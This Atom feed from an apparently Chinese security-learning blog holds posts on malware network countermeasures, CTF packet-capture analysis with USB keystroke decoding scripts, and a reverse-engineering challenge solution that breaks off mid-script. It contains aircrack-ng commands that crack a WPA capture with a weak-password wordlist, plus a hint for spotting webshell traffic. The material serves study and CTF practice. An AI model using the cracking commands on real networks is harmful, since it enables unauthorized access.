<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ESE&#39;s Note</title>
  
  <subtitle>阅览室</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-15T13:16:02.526Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>恶意代码分析———恶意代码的网络特征</title>
    <link href="http://yoursite.com/2018/05/16/re_18_evil_5/"/>
    <id>http://yoursite.com/2018/05/16/re_18_evil_5/</id>
    <published>2018-05-16T12:49:18.000Z</published>
    <updated>2018-05-15T13:16:02.526Z</updated>
    
    <content type="html"><![CDATA[<p>恶意代码大量使用网络连接，我们将解释如何开发基于网络的有效应对措施。<br><a id="more"></a></p><h1 id="网络应对措施"><a href="#网络应对措施" class="headerlink" title="网络应对措施"></a>网络应对措施</h1><p>网络行为的基本属性包含IP地址、TCP、与UDP端口、域名，以及流量内容等。因此，网络和安全设备可以利用它们，来提供网络应对措施，根据IP地址和端口，防火墙和路由器可以限制对网络的访问。配置DNS服务器，可以将一个已知的恶意域名重定向到内部主机，这被称为sinkhole技术。配置代理服务器，可以检测或者阻止访问某些域名。<br>入侵检测系统(IDS)、入侵防御系统(IPS),以及电子邮寄和web代理等其他安全应用。</p><h2 id="在原生环境中观察恶意代码"><a href="#在原生环境中观察恶意代码" class="headerlink" title="在原生环境中观察恶意代码"></a>在原生环境中观察恶意代码</h2><p>恶意代码分析的第一步不应该是在实验环境中运行恶意代码，也不应该是解刨恶意代码分析它的反汇编代码。与之相反的是，你应该首先查看已经获得的关于恶意代码的所有数据。恶意代码分析师经常是得到一个没有任何上下文的恶意代码样本(或是可疑的可执行文件)，但是在大多数情况下，你可以获取额外的更多数据。开始恶意代码网络行为分析的最好方法是挖掘恶意代码已经生成的日志、报警以及网络包。<br>来自真实网络的信息比来自实验环境的信息，有着明显的优势。<br>1、真实环境捕获的信息将提供恶意应用程序真实 行为的最佳视图，而恶意代码可以被编程，以加入探测实验环境的能力。<br>2、活跃恶意代码的真实场景信息 能够提供独特的视角，来加快分析过程。真实流量提供了恶意代码在两个端点(客户端和服务器端)之间的通讯信息，然而，在实验环境里，分析者通常只能获取其中一端的信息。而分析恶意代码如何接受内容，比起分析恶意代码如何产生内容，往往会更具有挑战性。因此，双向的样本流量可以帮助分析师加快恶意代码解析<br>3、此外，当你被动地查看信息时，不存在 泄露给攻击者分析活动的风险。</p><h2 id="恶意代码行为的痕迹"><a href="#恶意代码行为的痕迹" class="headerlink" title="恶意代码行为的痕迹"></a>恶意代码行为的痕迹</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;恶意代码大量使用网络连接，我们将解释如何开发基于网络的有效应对措施。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>流量包分析</title>
    <link href="http://yoursite.com/2018/05/14/misc_8_pcapeng/"/>
    <id>http://yoursite.com/2018/05/14/misc_8_pcapeng/</id>
    <published>2018-05-14T10:49:18.000Z</published>
    <updated>2018-05-16T09:30:14.131Z</updated>
    
    <content type="html"><![CDATA[<p>流量包分析<br><a id="more"></a></p><h1 id="usb流量包"><a href="#usb流量包" class="headerlink" title="usb流量包"></a>usb流量包</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到数据包使用wireshark打开后看到Protocol 为USB协议。USB协议的数据部分在Leftover Capture Data域之中，kali下可以用tshark命令可以将 leftover capture data单独提取出来 命令如下：<br><code>tshark -r usb1.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code><br>运行命令并查看usbdata.txt 发现数据包长度为八个字节,这里查到USB流量分为键盘流量和鼠标流量</p><p>键盘数据包的数据长度为8个字节，击键信息集中在第3个字节，每次key stroke都会产生一个keyboard event usb packet。<br>鼠标数据包的数据长度为4个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。<br>这里数据包长度是八个字节显然为键盘数据包<br>这里有usb的的映射表<br><code>http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</code><br>usb keyboard的映射表 根据这个映射表有写脚本解码得出的数据包<br><img src="https://i.imgur.com/VnMi8mX.png" alt=""></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"\n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>, <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</div><div class="line">nums = []</div><div class="line">keys = open(<span class="string">'usbdata.txt'</span>)</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</div><div class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span>:</div><div class="line">         <span class="keyword">continue</span></div><div class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</div><div class="line">keys.close()</div><div class="line">output = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</div><div class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</div><div class="line">        output += mappings[n]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        output += <span class="string">'[unknown]'</span></div><div class="line"><span class="keyword">print</span> <span class="string">'output :\n'</span> + output</div></pre></td></tr></table></figure><h2 id="鼠标流量数据包转换脚本"><a href="#鼠标流量数据包转换脚本" class="headerlink" title="鼠标流量数据包转换脚本"></a>鼠标流量数据包转换脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">nums = [] </div><div class="line">keys = open(<span class="string">'data.txt'</span>,<span class="string">'r'</span>) </div><div class="line">posx = <span class="number">0</span> </div><div class="line">posy = <span class="number">0</span> </div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys: </div><div class="line"><span class="keyword">if</span> len(line) != <span class="number">12</span> : </div><div class="line">     <span class="keyword">continue</span> </div><div class="line">x = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>) </div><div class="line">y = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>) </div><div class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> : </div><div class="line">    x -= <span class="number">256</span> </div><div class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> : </div><div class="line">    y -= <span class="number">256</span> </div><div class="line">posx += x </div><div class="line">posy += y </div><div class="line">btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></div><div class="line"><span class="keyword">if</span> btn_flag == <span class="number">1</span> : </div><div class="line">    <span class="keyword">print</span> posx , posy </div><div class="line">keys.close()</div></pre></td></tr></table></figure><h2 id="笔记本键盘"><a href="#笔记本键盘" class="headerlink" title="笔记本键盘"></a>笔记本键盘</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">nums=[<span class="number">0x66</span>,<span class="number">0x30</span>,<span class="number">0x39</span>,<span class="number">0x65</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x63</span>,<span class="number">0x31</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x32</span>,<span class="number">0x78</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x6d</span>,<span class="number">0x76</span>,<span class="number">0x79</span>,<span class="number">0x67</span>,<span class="number">0x37</span>,<span class="number">0x77</span>,<span class="number">0x7a</span>,<span class="number">0x6c</span>,<span class="number">0x73</span>,<span class="number">0x75</span>,<span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x69</span>,<span class="number">0x6a</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x70</span>]</div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> nums:</div><div class="line">    s+=chr(x)</div><div class="line"><span class="keyword">print</span> s</div><div class="line"></div><div class="line">mappings = &#123; <span class="number">0x41</span>:<span class="string">"A"</span>,  <span class="number">0x42</span>:<span class="string">"B"</span>,  <span class="number">0x43</span>:<span class="string">"C"</span>, <span class="number">0x44</span>:<span class="string">"D"</span>, <span class="number">0x45</span>:<span class="string">"E"</span>, <span class="number">0x46</span>:<span class="string">"F"</span>, <span class="number">0x47</span>:<span class="string">"G"</span>,  <span class="number">0x48</span>:<span class="string">"H"</span>, <span class="number">0x49</span>:<span class="string">"I"</span>,  <span class="number">0x4a</span>:<span class="string">"J"</span>, <span class="number">0x4b</span>:<span class="string">"K"</span>, <span class="number">0x4c</span>:<span class="string">"L"</span>, <span class="number">0x4d</span>:<span class="string">"M"</span>, <span class="number">0x4e</span>:<span class="string">"N"</span>,<span class="number">0x4f</span>:<span class="string">"O"</span>,  <span class="number">0x50</span>:<span class="string">"P"</span>, <span class="number">0x51</span>:<span class="string">"Q"</span>, <span class="number">0x52</span>:<span class="string">"R"</span>, <span class="number">0x53</span>:<span class="string">"S"</span>, <span class="number">0x54</span>:<span class="string">"T"</span>, <span class="number">0x55</span>:<span class="string">"U"</span>,<span class="number">0x56</span>:<span class="string">"V"</span>, <span class="number">0x57</span>:<span class="string">"W"</span>, <span class="number">0x58</span>:<span class="string">"X"</span>, <span class="number">0x59</span>:<span class="string">"Y"</span>, <span class="number">0x5a</span>:<span class="string">"Z"</span>, <span class="number">0x60</span>:<span class="string">"0"</span>, <span class="number">0x61</span>:<span class="string">"1"</span>, <span class="number">0x62</span>:<span class="string">"2"</span>, <span class="number">0x63</span>:<span class="string">"3"</span>, <span class="number">0x64</span>:<span class="string">"4"</span>,  <span class="number">0x65</span>:<span class="string">"5"</span>, <span class="number">0x66</span>:<span class="string">"6"</span>, <span class="number">0x67</span>:<span class="string">"7"</span>, <span class="number">0x68</span>:<span class="string">"8"</span>, <span class="number">0x69</span>:<span class="string">"9"</span>, <span class="number">0x6a</span>:<span class="string">"*"</span>, <span class="number">0x6b</span>:<span class="string">"+"</span>,  <span class="number">0X6c</span>:<span class="string">"separator"</span>, <span class="number">0x6d</span>:<span class="string">"-"</span>,  <span class="number">0x6e</span>:<span class="string">"."</span>, <span class="number">0x6f</span>:<span class="string">"/"</span> &#125;</div><div class="line"></div><div class="line">output = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</div><div class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</div><div class="line">        output += mappings[n]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        output += <span class="string">'[unknown]'</span></div><div class="line"><span class="keyword">print</span> <span class="string">'output :\n'</span> + output</div></pre></td></tr></table></figure><h1 id="Wireshark的使用姿势"><a href="#Wireshark的使用姿势" class="headerlink" title="Wireshark的使用姿势"></a>Wireshark的使用姿势</h1><h2 id="过滤报文"><a href="#过滤报文" class="headerlink" title="过滤报文"></a>过滤报文</h2><p>1.过滤IP，如源IP或者目标 x.x.x.x<br>ip.src eq x.x.x.x or ip.dst eq x.x.x.x<br>2.过滤端口<br>tcp.port eq 80 or udp.port eq 80<br>3.过滤协议<br>tcp/udp/arp/icmp/http/ftp/dns/ip……<br>4.过滤MAC<br>eth.dst ==A0:00:00:04:C5:84<br>5.包长度过滤<br>6.http模式过滤<br>http.request.method== “GET”<br>7.ftp<br>ftp-data</p><h2 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h2><p>1.在statistics下选择protocol hierarchy，可以查看当前数据包中包含哪些协议<br>2.将所有选项都展开，通常我们关注HTTP协议的内容，其他明文的TCP协议或UDP协议内容也有可能需要关注。<br>3.在我们关注的协议上右键点击apply as filter -&gt;selected，可以过滤出需要的协议类型。</p><h2 id="流汇聚"><a href="#流汇聚" class="headerlink" title="流汇聚"></a>流汇聚</h2><p>在关注的http数据包或tcp数据包中选择流汇聚，可以将HTTP流或TCP流汇聚或还原成数据，在弹出的框中可以看到数据内容。<br>1、HTML中直接包含重要信息<br>2、上传或下载文件内容，通常包含文件名、hash值等关键信息，常用POST请求上传。<br>3、一句话木马，POST请求，内容包含eval，内容使用base64加密<br>4、TCP流：通常是命令行操作。</p><h2 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h2><p>使用wireshark可以自动提取通过http传输的文件内容，方法如下：<br>file-&gt;exportobjects-&gt;http<br>在打开的对象列表中找到有价值的文件，如压缩文件、文本文件、音频文件、图片等，点击saveas进行保存，或者saveall保存所有对象再进入文件夹进行分析。</p><h2 id="无线密码破解"><a href="#无线密码破解" class="headerlink" title="无线密码破解"></a>无线密码破解</h2><p>有时候我们打开一个文件，里面只有wireless LAN 协议，很有可能是WPA或WEP加密后的无线数据包。<br>使用aircrack-ng应用程序可以进行解密。<br>1、首先是命令行模式的教程，将目标加密包复制到aircrack-ng文件夹下<br>（1）用aircrack-ng检查cap包：<br>aircrack-ng.exeshipin.cap<br>（2）使用弱口令字典破解wpa加密<br>aircrack-ng.exe shipin.cap -w wordlist.txt<br>这里wordlist.txt是弱口令字典，包含了常见的路由器密码，可以网上下载到，也可以自动生成。<br>（3）用密码解密cap<br>这里用到airdecap-ng解密cap报文，使用到了刚才的essid和破解的密码<br>airdecap-ng.exe shipin.cap -e 0719 -p 88888888<br>于是在目录下生成一个shipin-dec.cap，使用wireshark打开。<br>参考: <a href="http://www.freebuf.com/column/153197.html" target="_blank" rel="external">http://www.freebuf.com/column/153197.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;流量包分析&lt;br&gt;
    
    </summary>
    
      <category term="misc" scheme="http://yoursite.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>Re题目</title>
    <link href="http://yoursite.com/2018/05/10/re_17_ti/"/>
    <id>http://yoursite.com/2018/05/10/re_17_ti/</id>
    <published>2018-05-10T11:45:50.000Z</published>
    <updated>2018-05-15T00:35:38.267Z</updated>
    
    <content type="html"><![CDATA[<p>做了一天的Re题目<br><a id="more"></a></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>链接：<a href="https://pan.baidu.com/s/1u7IHEIt4045aLwKhh_soLw" target="_blank" rel="external">https://pan.baidu.com/s/1u7IHEIt4045aLwKhh_soLw</a> 密码：2oz4</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>一看加密函数不多，感觉可以快速做出来。然后，就做了很久很久。<br>直接找到加密函数<br><img src="https://i.imgur.com/D1nTvUg.png" alt=""><br>用od找到初始化生成的数组，并且dump出来<br><img src="https://i.imgur.com/RtC9Xtr.png" alt=""></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf8</span></div><div class="line"><span class="comment">#flag&#123;e4435341-401a-4bc4-96c1-eadf1951d904&#125;</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ini_juz</span><span class="params">(index)</span>:</span></div><div class="line">init_key=<span class="string">'''</span></div><div class="line"><span class="string">D1 FD 44 F8 A8 86 FC 60 78 9B 3C CA DC DA 33 71</span></div><div class="line"><span class="string">31 57 2F B7 D5 60 75 D1 AD E4 50 F1 B7 51 6D C1</span></div><div class="line"><span class="string">55 08 5A 92 73 4D 2B E7 71 A6 A5 09 BA B5 68 DF</span></div><div class="line"><span class="string">C0 17 CF BE 65 DC 53 4B 15 EC 82 C2 09 2B 51 86</span></div><div class="line"><span class="string">BC 3C 38 B9 7F D8 09 70 7A 21 D9 29 8B 24 7C 43</span></div><div class="line"><span class="string">BE CF C5 9B B6 E1 83 76 9F 84 64 1D 82 A3 1F FA</span></div><div class="line"><span class="string">4C A6 09 0F EB 5B 5D 91 BC 67 2B 98 E6 E1 D2 5F</span></div><div class="line"><span class="string">F6 F4 94 E7 57 53 B9 BE C0 CF 3B FB DD C7 3D B4</span></div><div class="line"><span class="string">'''</span></div><div class="line">key=init_key.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">''</span>,<span class="string">''</span>)</div><div class="line">data=bytearray.fromhex(key)</div><div class="line">data1=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</div><div class="line">data1.append(hex(data[i]))</div><div class="line">c1=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">-1</span>,<span class="number">-1</span>):</div><div class="line">c1.append(data1[index+i])</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line"><span class="keyword">if</span> len(c1[i])!=<span class="number">4</span>:</div><div class="line">k=<span class="string">'0x0'</span>+c1[i][<span class="number">2</span>:]</div><div class="line">c1[i]=k</div><div class="line">k=c1[<span class="number">0</span>][<span class="number">2</span>:]+c1[<span class="number">1</span>][<span class="number">2</span>:]+c1[<span class="number">2</span>][<span class="number">2</span>:]+c1[<span class="number">3</span>][<span class="number">2</span>:]</div><div class="line"><span class="keyword">return</span> k</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_juz</span><span class="params">(index)</span>:</span></div><div class="line">data=<span class="string">'''</span></div><div class="line"><span class="string">D6 90 E9 FE CC E1 3D B7 16 B6 14 C2 28 FB 2C 05</span></div><div class="line"><span class="string">2B 67 9A 76 2A BE 04 C3 AA 44 13 26 49 86 06 99</span></div><div class="line"><span class="string">9C 42 50 F4 91 EF 98 7A 33 54 0B 43 ED CF AC 62</span></div><div class="line"><span class="string">E4 B3 1C A9 C9 08 E8 95 80 DF 94 FA 75 8F 3F A6</span></div><div class="line"><span class="string">47 07 A7 FC F3 73 17 BA 83 59 3C 19 E6 85 4F A8</span></div><div class="line"><span class="string">68 6B 81 B2 71 64 DA 8B F8 EB 0F 4B 70 56 9D 35</span></div><div class="line"><span class="string">1E 24 0E 5E 63 58 D1 A2 25 22 7C 3B 01 21 78 87</span></div><div class="line"><span class="string">D4 00 46 57 9F D3 27 52 4C 36 02 E7 A0 C4 C8 9E</span></div><div class="line"><span class="string">EA BF 8A D2 40 C7 38 B5 A3 F7 F2 CE F9 61 15 A1</span></div><div class="line"><span class="string">E0 AE 5D A4 9B 34 1A 55 AD 93 32 30 F5 8C B1 E3</span></div><div class="line"><span class="string">1D F6 E2 2E 82 66 CA 60 C0 29 23 AB 0D 53 4E 6F</span></div><div class="line"><span class="string">D5 DB 37 45 DE FD 8E 2F 03 FF 6A 72 6D 6C 5B 51</span></div><div class="line"><span class="string">8D 1B AF 92 BB DD BC 7F 11 D9 5C 41 1F 10 5A D8</span></div><div class="line"><span class="string">0A C1 31 88 A5 CD 7B BD 2D 74 D0 12 B8 E5 B4 B0</span></div><div class="line"><span class="string">89 69 97 4A 0C 96 77 7E 65 B9 F1 09 C5 6E C6 84</span></div><div class="line"><span class="string">18 F0 7D EC 3A DC 4D 20 79 EE 5F 3E D7 CB 39 48</span></div><div class="line"><span class="string">'''</span></div><div class="line">key=data.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">''</span>,<span class="string">''</span>)</div><div class="line">data=bytearray.fromhex(key)</div><div class="line"><span class="keyword">return</span> data[index]</div><div class="line"></div><div class="line"><span class="comment">#循环移位 k为正，左移k位，k位负，右移k位</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo</span><span class="params">(lst, k)</span>:</span></div><div class="line">   <span class="keyword">return</span> lst[k:] + lst[:k]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xolr</span><span class="params">(num,k)</span>:</span></div><div class="line">sum=bin(num)[<span class="number">2</span>:]</div><div class="line"><span class="keyword">if</span> len(sum)!=<span class="number">32</span>:</div><div class="line">k1=<span class="number">32</span>-len(sum)</div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(k1):</div><div class="line">s=s+<span class="string">'0'</span></div><div class="line">sum=s+sum</div><div class="line">data=demo(sum,k)</div><div class="line">data=int(data,<span class="number">2</span>)</div><div class="line"><span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc_re1</span><span class="params">()</span>:</span></div><div class="line">enc_flag=<span class="string">"F4 88 91 C2 9B 20 5B 03 F1 ED F6 13 46 3C 55 81 61 0F FF 14 6E 1C 48 28 79 9F 85 AF C5 58 0D D6 A5 D9 64 FD 46 09 8C DF 3B A5 37 62 5A A6 D2 4B"</span></div><div class="line">key=enc_flag.replace(<span class="string">' '</span>,<span class="string">''</span>)</div><div class="line">data1=bytearray.fromhex(key)</div><div class="line">enc_re1=[]</div><div class="line">k=<span class="number">51</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</div><div class="line">enc_re1.append(hex(data1[i]^(<span class="number">51</span>+i)))</div><div class="line"><span class="keyword">return</span> enc_re1</div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_4</span><span class="params">(data)</span>:</span></div><div class="line">c=[]</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line"><span class="keyword">if</span> i&gt;=<span class="number">16</span>:</div><div class="line"><span class="keyword">break</span></div><div class="line">k=data[i][<span class="number">2</span>:]+data[i+<span class="number">1</span>][<span class="number">2</span>:]+data[i+<span class="number">2</span>][<span class="number">2</span>:]+data[i+<span 